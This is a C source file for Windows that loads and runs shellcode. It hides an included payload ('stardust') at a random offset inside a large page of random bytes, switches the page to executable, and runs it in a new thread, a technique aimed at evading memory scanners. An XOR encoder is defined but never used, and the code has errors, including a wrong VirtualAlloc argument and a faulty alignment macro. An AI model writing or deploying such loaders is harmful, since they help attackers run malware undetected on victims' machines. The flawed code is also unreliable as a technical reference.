#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <ntsecapi.h>

#include "sc.h"

#define RANDOM_NUMB(min, max) (rand() % (max + 1 - min) + min)
#define ALIGN_PAGE(n) ((n + 0x1000) & ~(0x1000))

#define FACTOR 2048

typedef struct _PAGE_SHELLCODE_CONTEXT {
	UINT8 u8Key;
	DWORD dwLocation;
	SIZE_T uSize;
	LPVOID lpPage;
} PAGE_SHELLCODE_CONTEXT, * PPAGE_SHELLCODE_CONTEXT;

PPAGE_SHELLCODE_CONTEXT AllocateLargePage(IN HANDLE hTarget, IN DWORD cbPageSize)
{
	PPAGE_SHELLCODE_CONTEXT pCtx = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PAGE_SHELLCODE_CONTEXT));
	if (pCtx == NULL)
		return NULL;

	pCtx->uSize = ALIGN_PAGE(cbPageSize * FACTOR);
	if ((pCtx->lpPage = VirtualAlloc(hTarget, pCtx->uSize, MEM_COMMIT, PAGE_READWRITE)) != NULL)
	{
		RtlGenRandom(pCtx->lpPage, pCtx->uSize);
		pCtx->dwLocation = RANDOM_NUMB(0, pCtx->uSize);
	}

	return pCtx;
}

VOID DestroyCtx(IN PPAGE_SHELLCODE_CONTEXT pCtx)
{
	if (pCtx != NULL)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, (LPVOID)pCtx);
}

VOID EncodeShellcodeContent(PPAGE_SHELLCODE_CONTEXT pCtx, PBYTE pbBuffer, SIZE_T cbBuffer, UINT8 u8Key)
{
	if (u8Key == 0)
		pCtx->u8Key = (RANDOM_NUMB(0, 0xFF) & 0xFF);

	for (SIZE_T i = 0; i < cbBuffer; i++)
	{
		pbBuffer[i] ^= pCtx->u8Key;
	}
}

VOID PlaceShellcodeRand(PPAGE_SHELLCODE_CONTEXT pCtx, PBYTE pbBuffer, SIZE_T cbBuffer)
{
	RtlCopyMemory((PBYTE)pCtx->lpPage + pCtx->dwLocation, pbBuffer, cbBuffer);
}

VOID ExecuteShellcode(PPAGE_SHELLCODE_CONTEXT pCtx)
{
	DWORD dwOldProtect;
	if (VirtualProtect(pCtx->lpPage, pCtx->uSize, PAGE_EXECUTE_READWRITE, &dwOldProtect))
	{
		PBYTE pbLocation = (PBYTE)pCtx->lpPage + pCtx->dwLocation;

		HANDLE hThread;
		if ((hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pbLocation, 0, 0, 0)))
		{
			WaitForSingleObject(hThread, INFINITE);
		}
	}

	RtlSecureZeroMemory(pCtx->lpPage, pCtx->uSize);
	VirtualFree(pCtx->lpPage, 0, MEM_RELEASE);
}

int main()
{
	srand(time(NULL));

	PPAGE_SHELLCODE_CONTEXT ctx = AllocateLargePage(NULL, (SIZE_T)stardust_x64_bin_len);
	if (ctx == NULL) {
		return -1;
	}

	PlaceShellcodeRand(ctx, stardust_x64_bin, (SIZE_T)stardust_x64_bin_len);

	ExecuteShellcode(ctx);
	DestroyCtx(ctx);

	return 0;
}